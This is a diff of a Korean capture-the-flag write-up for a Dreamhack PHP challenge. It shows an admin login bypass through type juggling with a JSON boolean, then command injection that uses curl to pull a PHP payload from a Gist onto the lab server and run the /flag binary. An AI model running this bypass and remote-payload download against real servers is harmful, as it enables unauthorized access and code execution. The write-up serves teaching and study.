@@ -2,7 +2,8 @@
 
 ### 1. VM에 접속한다
 
-문제 페이지에는 사용자명을 입력하는 폼이 있다. 입력값은 `index.php`에서 JSON으로 파싱되며, 인증 후 `test.php`로 이동한다.
+<img width="1274" height="453" alt="image" src="https://github.com/user-attachments/assets/1347d451-42ba-447e-a412-cdb8996f5b6b" />
+
 
 ### 2. 코드 분석 — PHP Type Juggling으로 관리자 인증 우회
 
@@ -20,9 +21,7 @@ switch ($username) {
     case "admin":
         $user = "admin";
         $password = "***REDACTED***";
-        // 고정된 계정 정보로 DB 조회 후 결과가 1건이면
-        // $_SESSION["auth"] = "admin";
-        // header("Location: test.php");
+  
         break;
     default:
         $_SESSION["auth"] = "guest";
@@ -31,14 +30,19 @@ switch ($username) {
 ```
 
 - `===`는 **값과 자료형을 모두 비교**하므로, Boolean `true`는 문자열 `"admin"`과 일치하지 않는다.
-- 반면 `switch`의 `case` 비교는 **느슨한 비교(`==`)**를 사용한다. PHP 8에서 `true == "admin"`은 참이므로 관리자 분기에 진입할 수 있다.
+- 반면 `switch`의 `case` 비교는 느슨한 비교(`==`)**를 사용한다. PHP 8에서 `true == "admin"`은 참이므로 관리자 분기에 진입할 수 있다.
+
+ - 느슨한 비교(==)가 Boolean과 문자열을 비교할 때 문자열을 Boolean으로 변환
+
+  ```php
+      (bool) "admin"  // true
+      (bool) "hello"  // true
+      (bool) "1"      // true
+      (bool) ""       // false
+      (bool) "0"      // false
+  ```
+  
 - 해당 분기는 사용자가 보낸 값을 DB 비밀번호로 쓰지 않고, 코드에 고정된 관리자 계정 정보로 조회한다. `deploy/mysql_init/init.sql`에도 `admin` 계정이 등록되어 있다.
-
-**② JSON Boolean `true`를 보낸다.**
-
-```json
-{"username":true}
-```
 
 Burp Suite Repeater에서 보낸 POST 요청:
 
@@ -52,13 +56,17 @@ username=%7B%22username%22%3Atrue%7D
 
 `%7B%22username%22%3Atrue%7D`는 `{"username":true}`를 URL 인코딩한 값이다.
 
+PHP의 `switch`문은 느슨한 비교(`==`)를 사용하므로, `username`에 Boolean `true`를 전달하면 `case "admin"`과 일치하여 관리자 분기로 진입할 수 있다.
+
 ```text
 true === "admin" → false (차단 조건 통과)
 switch(true) → case "admin" 일치
 DB 조회 결과 1건 → $_SESSION["auth"] = "admin"
 ```
+<img width="526" height="191" alt="image" src="https://github.com/user-attachments/assets/2568f599-f88b-471d-8e96-770ed111dd44" />
+<img width="544" height="264" alt="image" src="https://github.com/user-attachments/assets/ff18c90e-bb59-4986-83fc-c881278efaf4" />
 
-응답에서 `302 Found`, `Location: test.php`, `PHPSESSID`를 확인하고 이후 요청에 같은 세션 쿠키를 사용한다. **302 자체는 관리자 인증의 증거가 아니다.** Guest 분기도 같은 경로로 리다이렉트하기 때문에, 이후 관리자 전용 명령 실행 동작으로 권한을 확인한다.
+
 
 ### 3. 코드 분석 — `test.php`의 명령 실행
 
@@ -95,6 +103,16 @@ echo "<pre>$result</pre>";   // HTML에서 다른 변수를 출력
 
 `/flag`를 직접 `cmd`에 입력하면 `flag` 단어가 블랙리스트에 걸린다. 그래서 외부 PHP 파일에 실행 코드를 넣고 이를 서버로 내려받는 방식을 사용했다.
 
+
+https://gist.github.com/ 해당 링크에 접속한다
+
+<img width="1437" height="708" alt="image" src="https://github.com/user-attachments/assets/0592480c-ba25-4120-97c3-f6c8f7d94dc4" />
+
+<img width="1013" height="249" alt="image" src="https://github.com/user-attachments/assets/c002eed4-a00c-4518-93fc-44920adcede8" />
+
+사진처럼 입력하고 생성한다
+
+
 **Gist의 `run.php` 내용**
 
 ```php
@@ -102,8 +120,8 @@ echo "<pre>$result</pre>";   // HTML에서 다른 변수를 출력
 passthru('/flag');
 ?>
 ```
+왜 cat flag가 아니라 passthru로 운영체제 명령어처럼 실행할까?
 
-`passthru()`는 프로그램을 실행하고 그 출력을 직접 응답에 전달한다. 문제의 `Dockerfile`을 보면 `/flag`는 텍스트 파일이 아니라 `flag.c`를 컴파일한 실행 파일이다.
 
 ```dockerfile
 COPY ./flag.c /flag.c
@@ -112,30 +130,49 @@ RUN gcc /flag.c -o /flag && \
     rm /flag.c
 ```
 
+바로 flag.c가 컴파일 되서 실행파일이 되었기 때문이다.
+
+RUN gcc /flag.c -o /flag
+
+
+
+<img width="1095" height="394" alt="image" src="https://github.com/user-attachments/assets/297baed8-ca32-4256-89c8-04cc3206c4aa" />
+
+생성이 완료 됐으면 raw 를 클릭 후 url을 복사한다
+
+<img width="1205" height="253" alt="image" src="https://github.com/user-attachments/assets/96f8802f-4d54-47bc-a48b-682b7623ba0b" />
+
+
 관리자 세션을 유지한 상태에서 Burp Repeater로 다음 요청을 보낸다.
 
+<img width="529" height="160" alt="image" src="https://github.com/user-attachments/assets/27d82cd4-118f-4a1f-80f3-ff04a31fc798" />
+
+<img width="316" height="160" alt="image" src="https://github.com/user-attachments/assets/50b2183f-ce14-4ad3-b887-ab5c49e76e15" />
+
+<img width="535" height="287" alt="image" src="https://github.com/user-attachments/assets/11be12dc-84ec-4f06-b74d-f56313a6ea43" />
+
+
 ```http
-GET /test.php?cmd=curl%20-fsSL%20https%3A%2F%2Fgist.githubusercontent.com%2Fmyhtml1231-star%2F1782817ec026490b75c425a742f53c8a%2Fraw%2Fd465571a999d0c87a875fc83cbb8f550da074923%2Frun.php%20-o%20run.php HTTP/1.1
-Host: host3.dreamhack.games:21271
+GET /test.php?cmd=curl%20-fsSL%20<GIST_RAW_URL>%20-o%20run.php HTTP/1.1
+Host: <서버주소:포트>
 Cookie: PHPSESSID=<관리자_세션_ID>
 ```
 
+``` text
+- GIST_RAW_URL : 본인이 만든 run.php의 Gist Raw URL (실제 요청에서는 URL 인코딩)
+- 서버주소:포트 : 본인의 Dreamhack VM 주소
+- 관리자_세션_ID : 인증 우회 후 발급받은 PHP 세션 ID
+
 실제로 실행하도록 전달한 명령은 다음과 같다.
-
-```bash
-curl -fsSL https://gist.githubusercontent.com/myhtml1231-star/1782817ec026490b75c425a742f53c8a/raw/d465571a999d0c87a875fc83cbb8f550da074923/run.php -o run.php
 ```
-
-`curl -fsSL`로 Gist 원본을 가져와 `-o run.php`로 저장한다. `cmd`에는 `flag`라는 문자열이 없으므로 `test.php`의 블랙리스트가 PHP 파일 내부의 `passthru('/flag')`를 검사하지 않는다. 다운로드 후 화면에 별다른 출력이 없어도, 앞서 확인한 변수명 불일치 때문에 그럴 수 있다.
 
 ### 5. `run.php` 실행 후 FLAG 확인
 
-서버의 웹 디렉터리에 저장된 `run.php`에 직접 접근한다.
+http://host3.dreamhack.games:<본인의 vm 포트번호>/run.php에 접속하여 서버의 웹 디렉터리에 저장된 run.php에 접근한다
 
-```http
-GET /run.php HTTP/1.1
-Host: host3.dreamhack.games:21271
-```
+<img width="614" height="140" alt="image" src="https://github.com/user-attachments/assets/22aca2ff-9405-4104-b982-dca10c5f377f" />
+
+
 
 ```text
 GET /run.php
@@ -146,6 +183,8 @@ passthru('/flag')
     ↓
 /flag 실행 파일의 표준 출력이 HTTP 응답에 표시
 ```
+
+
 
 **확인한 FLAG**
 
